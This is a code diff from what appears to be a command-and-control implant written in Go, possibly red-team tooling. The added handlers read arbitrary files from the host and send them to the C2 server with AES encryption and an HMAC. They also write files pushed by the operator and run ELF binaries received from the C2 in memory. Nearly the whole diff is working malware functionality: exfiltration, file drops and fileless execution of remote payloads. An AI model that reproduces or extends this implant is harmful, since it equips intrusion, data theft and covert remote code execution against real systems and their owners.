@@ -7,6 +7,7 @@ import (
 	"os"
 	"purpcmd/implant"
 	"purpcmd/internal/encrypt"
+	//"strings"
 	"syscall"
 )
 
@@ -30,11 +31,38 @@ func HandlePing(ctx *CommandContext, payload []byte, tid [8]byte) string {
 	return taskRestEnc
 }
 
-// HandleDownload handles the DOWN command
-func HandleDownload(ctx *CommandContext, tid [8]byte) string {
+// HandleDownload handles the DOWN command - uploads file content to C2
+func HandleDownload(ctx *CommandContext, payload []byte, tid [8]byte) string {
 	println("\n-> DOWN")
-	taskResp := PackChunk(ctx.Implant, "any.txt", []byte("aaa"), tid)
 
+	// Get filename from payload
+	filename := string(payload)
+	if filename == "" {
+		responseTaskPayload := "Error: No filename provided for download"
+		taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
+		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
+		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
+		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
+		println(taskRestEnc)
+		return taskRestEnc
+	}
+
+	// Read file contents
+	fileData, err := os.ReadFile(filename)
+	if err != nil {
+		responseTaskPayload := fmt.Sprintf("Error reading file %s: %s", filename, err.Error())
+		taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
+		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
+		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
+		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
+		println(taskRestEnc)
+		return taskRestEnc
+	}
+
+	println(fmt.Sprintf("Uploading file %s (%d bytes) to C2", filename, len(fileData)))
+
+	// Pack file as chunk and send to C2
+	taskResp := PackChunk(ctx.Implant, filename, fileData, tid)
 	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
@@ -59,11 +87,19 @@ func HandleUpload(ctx *CommandContext, payload []byte, tid [8]byte) string {
 	dataStart := dataLenStart + 4
 	data := payload[dataStart : uint32(dataStart)+uint32(dataLen)]
 
-	println("got file name ", name, " with data ", string(data))
+	println("got file name ", string(name), " with ", dataLen, " bytes")
 
-	responseTaskPayload := "saved file to " + string(name)
+	// Write file to disk
+	err := os.WriteFile(string(name), data, 0644)
+
+	var responseTaskPayload string
+	if err != nil {
+		responseTaskPayload = fmt.Sprintf("Failed to save file %s: %s", string(name), err.Error())
+	} else {
+		responseTaskPayload = fmt.Sprintf("Saved file to %s (%d bytes)", string(name), len(data))
+	}
+
 	taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
-
 	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
@@ -171,6 +207,94 @@ func HandleLS(ctx *CommandContext, payload []byte, tid [8]byte) string {
 	}
 
 	taskResp := PackResponse(ctx.Implant, []byte(output), tid)
+	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
+	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
+	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
+	println(taskRestEnc)
+	return taskRestEnc
+}
+
+// HandleMEMEXEC handles the EXEC command - executes ELF binary in memory
+func HandleMEMEXEC(ctx *CommandContext, payload []byte, tid [8]byte) string {
+	println("\n-> EXEC")
+
+	// Payload format:
+	// Bytes 0-1: length of arguments string (big endian)
+	// Bytes 2 to 2+argsLen: arguments (space-separated)
+	// Remaining bytes: ELF binary data
+
+	if len(payload) < 2 {
+		responseTaskPayload := "Error: Invalid payload for EXEC command"
+		taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
+		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
+		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
+		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
+		println(taskRestEnc)
+		return taskRestEnc
+	}
+
+	// Parse arguments length
+	/*argsLen := binary.BigEndian.Uint16(payload[:2])
+
+	// Ensure we have enough data
+	if len(payload) < int(2+argsLen) {
+		responseTaskPayload := "Error: Payload too short for specified arguments"
+		taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
+		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
+		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
+		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
+		println(taskRestEnc)
+		return taskRestEnc
+	}
+
+	// Extract arguments
+	var args []string
+	if argsLen > 0 {
+		argsStr := string(payload[2 : 2+argsLen])
+		if argsStr != "" {
+			args = strings.Fields(argsStr)
+		}
+	}
+
+	// Extract ELF binary data
+	elfData := payload[2+argsLen:]
+
+	if len(elfData) == 0 {
+		responseTaskPayload := "Error: No ELF binary data provided"
+		taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
+		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
+		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
+		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
+		println(taskRestEnc)
+		return taskRestEnc
+	}
+
+	println(fmt.Sprintf("Executing ELF binary in memory (%d bytes) with args: %v", len(elfData), args))
+
+	// Execute ELF in memory*/
+	nameLen := binary.BigEndian.Uint16(payload[:2])
+	name := payload[2 : 2+nameLen]
+
+	dataLenStart := 2 + nameLen
+	dataLen := binary.BigEndian.Uint32(payload[dataLenStart : dataLenStart+4])
+
+	dataStart := dataLenStart + 4
+	data := payload[dataStart : uint32(dataStart)+uint32(dataLen)]
+
+	//TODO: do the argument passing wright
+	output, err := ExecuteELFInMemory(data, []string{string(name)})
+
+	var responseTaskPayload string
+	if err != nil {
+		responseTaskPayload = fmt.Sprintf("Execution error: %s\n\nOutput:\n%s", err.Error(), output)
+	} else {
+		responseTaskPayload = output
+		if responseTaskPayload == "" {
+			responseTaskPayload = "[No output - execution successful]"
+		}
+	}
+
+	taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
 	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
